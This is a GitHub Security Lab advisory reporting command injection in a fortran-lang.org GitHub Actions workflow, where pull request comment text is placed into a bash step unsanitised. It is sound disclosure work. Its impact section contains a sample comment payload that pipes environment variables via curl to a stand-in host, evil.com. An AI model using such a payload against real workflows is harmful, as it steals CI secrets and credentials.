<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-190: Command injection in fortran-lang/fortran-lang.org workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/16/2020: Report sent to vendor</li>
  <li>10/17/2020: Vendor acknowledges</li>
  <li>10/17/2020: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/fortran-lang/fortran-lang.org/blob/master/.github/workflows/gen_tweet.yaml">‘gen_tweet.yaml’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/fortran-lang/fortran-lang.org">fortran-lang/fortran-lang.org GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/fortran-lang/fortran-lang.org/blob/master/.github/workflows/gen_tweet.yaml">gen_tweet.yaml</a> from the master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-public-github-issue-comment-is-used-to-format-a-shell-command">Issue: The public GitHub issue comment is used to format a shell command</h3>

<p>When a user comments on a Pull Request with a <code class="language-plaintext highlighter-rouge">#tweet</code> it automatically starts the <a href="https://github.com/fortran-lang/fortran-lang.org/blob/master/.github/workflows/gen_tweet.yaml">gen_tweet.yaml</a> GitHub workflow. The comment text is used to format a bash script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="na">tweet</span><span class="pi">:</span>
    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
    <span class="na">if</span><span class="pi">:</span> <span class="s">github.event.issue.pull_request &amp;&amp; startsWith(github.event.comment.body,'#tweet')</span>
    <span class="na">steps</span><span class="pi">:</span>
<span class="nn">...</span>
    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">extract the new tweet message</span>
      <span class="na">id</span><span class="pi">:</span> <span class="s">get-comment-body</span>
      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">body=$(echo "${{github.event.comment.body}}" | sed '1 s/#tweet//' | sed '1 s/ //')</span>
<span class="s">...</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may comment with <code class="language-plaintext highlighter-rouge">#tweet `printenv | curl -X POST --data-binary @- http://evil.com`</code> which will exfiltrate the environment variables to the attacker controlled server. To make the attack less visible the attacker may modify the comment later.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-190</code> in any communication regarding this issue.</p>
